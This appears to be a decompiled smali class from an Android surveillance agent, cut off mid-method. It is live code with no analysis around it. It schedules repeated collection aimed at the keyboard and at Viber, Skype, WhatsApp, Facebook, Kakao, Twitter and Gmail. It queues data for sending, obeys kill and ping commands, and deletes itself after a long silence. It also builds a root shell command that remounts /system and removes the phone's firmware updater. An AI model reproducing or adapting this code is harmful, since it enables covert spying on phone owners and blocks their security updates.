.class public Lcom/network/android/agent/NetworkApp;
.super Lcom/network/android/android/monitor/AndroidMonitorApplication;


# static fields
.field public static a:Landroid/os/Handler;

.field public static final b:Ljava/util/concurrent/locks/ReentrantLock;

.field private static d:Ljava/util/Timer;

.field private static e:Landroid/content/Context;


# instance fields
.field private c:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "NetworkApp"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    sput-object v0, Lcom/network/android/agent/NetworkApp;->d:Ljava/util/Timer;

    new-instance v0, Ljava/util/concurrent/locks/ReentrantLock;

    invoke-direct {v0}, Ljava/util/concurrent/locks/ReentrantLock;-><init>()V

    sput-object v0, Lcom/network/android/agent/NetworkApp;->b:Ljava/util/concurrent/locks/ReentrantLock;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Lcom/network/android/android/monitor/AndroidMonitorApplication;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/network/android/agent/NetworkApp;->c:Z

    return-void
.end method

.method public static a()Landroid/content/Context;
    .locals 1

    sget-object v0, Lcom/network/android/agent/NetworkApp;->e:Landroid/content/Context;

    return-object v0
.end method

.method public static a(Landroid/content/Context;)V
    .locals 2

    const-string v0, "NetworkApp emptyDataQueueAyn"

    invoke-static {v0}, Lcom/network/android/g;->a(Ljava/lang/String;)V

    sget-object v0, Lcom/network/android/agent/NetworkApp;->a:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/agent/e;

    invoke-direct {v1, p0}, Lcom/network/android/agent/e;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method private static a(Landroid/content/Context;ILjava/lang/String;Landroid/app/AlarmManager;)V
    .locals 6

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "NetworApp removeHistory: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/network/media/CoreReceiver;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "TO_REMOVE:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const-string v1, "RemoveHistory"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "timeToStop"

    invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const-string v1, "toRemove"

    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-static {p0, v1, v0, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    int-to-long v4, p1

    add-long/2addr v2, v4

    invoke-virtual {p3, v1, v2, v3, v0}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "removeHistory"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method private static a(Landroid/content/Context;JJLjava/lang/String;Landroid/app/AlarmManager;)V
    .locals 7

    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "NetworApp onCreate setAlarm triggerAtMillis:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1, p2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", intervalMillis:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p3, p4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, " ,actionType:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/network/media/CoreReceiver;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, p5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/network/android/agent/NetworkApp;->e:Landroid/content/Context;

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-static {v1, v2, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    const/4 v1, 0x0

    move-object v0, p6

    move-wide v2, p1

    move-wide v4, p3

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "NetworApp setAlarm exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method static synthetic a(Lcom/network/android/agent/NetworkApp;)V
    .locals 4

    :try_start_0
    iget-boolean v0, p0, Lcom/network/android/agent/NetworkApp;->c:Z

    if-nez v0, :cond_1

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/network/android/agent/NetworkApp;->c:Z

    const-string v0, "NetworkPreferences"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/network/android/agent/NetworkApp;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "finish"

    const/4 v2, 0x1

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "dumpAll finishDump value:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/b/b;->d(Landroid/content/Context;)V

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "dumpAll started appstarted value:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-boolean v2, p0, Lcom/network/android/agent/NetworkApp;->c:Z

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/android/SmsReceiver;->b(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lcom/network/android/SmsReceiver;->b:Ljava/lang/String;

    const/4 v1, 0x1

    const/4 v2, 0x2

    const-string v3, "LOG_AGENT_INIT_SUCCESED"

    invoke-static {v1, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    invoke-static {}, Lcom/network/android/j;->a()Landroid/os/Handler;

    move-result-object v1

    invoke-static {p0, v1}, Lcom/network/android/a/c;->a(Landroid/content/Context;Landroid/os/Handler;)V

    if-nez v0, :cond_2

    sget-object v0, Lcom/network/android/agent/NetworkApp;->e:Landroid/content/Context;

    if-eqz v0, :cond_0

    invoke-static {}, Lcom/network/h/b;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "NetworkApp dumpAll content"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/b/b;->h()V

    const-string v0, "dump"

    invoke-static {v0}, Lcom/network/media/f;->a(Ljava/lang/String;)V

    :cond_0
    :goto_0
    sget-object v0, Lcom/network/b/b;->z:Ljava/lang/String;

    if-eqz v0, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "dumpAll removeHistory URL: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/network/b/b;->z:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Lcom/network/android/agent/NetworkApp;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    const/16 v1, 0x7530

    sget-object v2, Lcom/network/b/b;->z:Ljava/lang/String;

    invoke-static {p0, v1, v2, v0}, Lcom/network/android/agent/NetworkApp;->a(Landroid/content/Context;ILjava/lang/String;Landroid/app/AlarmManager;)V

    const v1, 0x493e0

    sget-object v2, Lcom/network/b/b;->z:Ljava/lang/String;

    invoke-static {p0, v1, v2, v0}, Lcom/network/android/agent/NetworkApp;->a(Landroid/content/Context;ILjava/lang/String;Landroid/app/AlarmManager;)V

    const v1, 0x927c0

    sget-object v2, Lcom/network/b/b;->z:Ljava/lang/String;

    invoke-static {p0, v1, v2, v0}, Lcom/network/android/agent/NetworkApp;->a(Landroid/content/Context;ILjava/lang/String;Landroid/app/AlarmManager;)V

    :cond_1
    :goto_1
    return-void

    :cond_2
    const-string v0, "read wake up"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/android/agent/NetworkApp;->b(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "dumpAll: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1

    :cond_3
    :try_start_1
    const-string v0, "dumpAll removeHistory : No URL to remove"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method

.method public static b(Landroid/content/Context;)V
    .locals 8

    const/4 v1, 0x0

    const/4 v0, 0x1

    :try_start_0
    invoke-static {p0}, Lcom/network/android/a/b;->a(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/network/android/j;->d(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_2

    const-string v0, "CoreReceiver mainLooper Have Data to send!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Lcom/network/android/j;->a(Landroid/content/Context;ZZ)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {p0}, Lcom/network/android/j;->a(Landroid/content/Context;)V

    :cond_0
    :goto_0
    return-void

    :cond_1
    const-string v0, "CoreReceiver mainLooper Can\'t Send Data!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "CoreReceiver mainLooper exception: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_2
    :try_start_1
    sget-object v2, Lcom/network/android/a/c;->a:Ljava/util/Vector;

    invoke-virtual {v2}, Ljava/util/Vector;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_4

    const-string v0, "CoreReceiver mainLooper Have HTTP ping to send for send back the command id!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    sget-boolean v0, Lcom/network/android/a/c;->i:Z

    if-eqz v0, :cond_3

    const-string v0, "CoreReceiver mainLooper Have to kill!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "KILL"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_3
    const/4 v0, 0x0

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Lcom/network/android/j;->a(Landroid/content/Context;ZZ)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "CoreReceiver mainLooper Have to ping!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_4
    sget-boolean v2, Lcom/network/android/a/c;->i:Z

    if-eqz v2, :cond_5

    const-string v0, "CoreReceiver mainLooper Have to kill!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "KILL"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_5
    invoke-static {}, Lcom/network/android/c/a/b;->c()Z

    move-result v2

    if-eqz v2, :cond_6

    const/4 v0, 0x0

    const/4 v1, 0x1

    invoke-static {p0, v0, v1}, Lcom/network/android/j;->a(Landroid/content/Context;ZZ)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "CoreReceiver mainLooper Have HTTP ping for empty the error log!!!!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "httpPing"

    invoke-static {p0, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_6
    const-string v2, "CoreReceiver PollingManager shouldSuicide check"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/b/b;->i()J

    move-result-wide v2

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "CoreReceiver PollingManager shouldSuicide - timeAfterLastCom (MILIseconds): "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-wide/16 v4, 0x0

    cmp-long v4, v2, v4

    if-eqz v4, :cond_7

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    div-long/2addr v4, v6

    sub-long v2, v4, v2

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "CoreReceiver PollingManager shouldSuicide - timeAfterLastCom (seconds): "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/b/b;->K()Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    int-to-long v4, v4

    cmp-long v4, v2, v4

    if-lez v4, :cond_7

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-wide/16 v4, 0x3c

    div-long v4, v2, v4

    invoke-virtual {v1, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, "CoreReceiver PollingManager shouldSuicide -  minutes with no comunication !!!!!"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-wide/16 v4, 0x5a0

    div-long/2addr v2, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "CoreReceiver PollingManager shouldSuicide -  days with no comunication !!!!!!"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v1, 0x1

    const/16 v2, 0x8

    const-string v3, "LOG_GRACE_PERIOD_TIMEOUT"

    invoke-static {v1, v2, v3}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    invoke-static {p0}, Lcom/network/android/a/c;->a(Landroid/content/Context;)V

    :goto_1
    if-eqz v0, :cond_8

    const-string v0, "CoreReceiver mainLooper shouldSuicide chek fail!!! Suicide procces started!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_7
    move v0, v1

    goto :goto_1

    :cond_8
    const-string v0, "CoreReceiver mainLooper Nothing To Do"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method static synthetic b(Lcom/network/android/agent/NetworkApp;)V
    .locals 10

    const v9, 0xea60

    const/4 v7, 0x0

    :try_start_0
    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Lcom/network/android/agent/NetworkApp;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/AlarmManager;

    const-string v5, "wake up"

    const-wide/16 v1, 0x7530

    const-wide/32 v3, 0xea60

    move-object v0, p0

    invoke-static/range {v0 .. v6}, Lcom/network/android/agent/NetworkApp;->a(Landroid/content/Context;JJLjava/lang/String;Landroid/app/AlarmManager;)V

    invoke-static {p0, v6}, Lcom/network/g/a;->a(Landroid/content/Context;Landroid/app/AlarmManager;)V

    invoke-static {}, Lcom/network/b/b;->c()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x9

    new-array v8, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "keyboard"

    aput-object v1, v8, v0

    const/4 v0, 0x1

    const-string v1, "viber"

    aput-object v1, v8, v0

    const/4 v0, 0x2

    const-string v1, "skype"

    aput-object v1, v8, v0

    const/4 v0, 0x3

    const-string v1, "whatsUp"

    aput-object v1, v8, v0

    const/4 v0, 0x4

    const-string v1, "facebook"

    aput-object v1, v8, v0

    const/4 v0, 0x5

    const-string v1, "kakao"

    aput-object v1, v8, v0

    const/4 v0, 0x6

    const-string v1, "twitter"

    aput-object v1, v8, v0

    const/4 v0, 0x7

    const-string v1, "gmail"

    aput-object v1, v8, v0

    const/16 v0, 0x8

    const-string v1, "GMail"

    aput-object v1, v8, v0

    :goto_0
    array-length v0, v8

    if-ge v7, v0, :cond_0

    mul-int v0, v9, v7

    const v1, 0x11170

    add-int/2addr v0, v1

    int-to-long v1, v0

    array-length v0, v8

    mul-int/2addr v0, v9

    int-to-long v3, v0

    aget-object v5, v8, v7

    move-object v0, p0

    invoke-static/range {v0 .. v6}, Lcom/network/android/agent/NetworkApp;->a(Landroid/content/Context;JJLjava/lang/String;Landroid/app/AlarmManager;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v7, 0x1

    move v7, v0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "NetworkApp setAlarms exception "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    :cond_0
    return-void
.end method

.method static synthetic d(Landroid/content/Context;)V
    .locals 3

    :try_start_0
    const-string v0, "changeSettings"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {p0}, Lcom/network/h/b;->d(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "changeSettings set off SOFTWARE_UPDATE_AUTO_UPDATE"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "SOFTWARE_UPDATE_AUTO_UPDATE"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$System;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    :goto_0
    new-instance v0, Ljava/io/File;

    const-string v1, "/system/csk"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "changeSettings remove auto update"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "mount -o remount,rw,exec,suid /system; rm /system/app/FotaClient.apk; rm /system/app/FotaClient.odex; pm disable com.sec.android.fotaclient;"

    invoke-static {}, Lcom/network/android/a/c;->e()Z

    move-result v1

    if-nez v1, :cond_0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "pm uninstall com.sec.android.fotaclient"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_0
    invoke-static {v0}, Lcom/network/android/m;->c(Ljava/lang/String;)V

    :cond_1
    :goto_1
    return-void

    :cond_2
    const-string v0, "changeSettings not install on system  not changing SOFTWARE_UPDATE_AUTO_UPDATE"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "changeSettings"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_1
.end method


# virtual methods
.method protected final a(Landroid/content/IntentFilter;)V
    .locals 6

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "NetworkApp 2.9.3 initialize start API: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", FINGERPRINT "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    invoke-virtual {p0}, Lcom/network/android/agent/NetworkApp;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

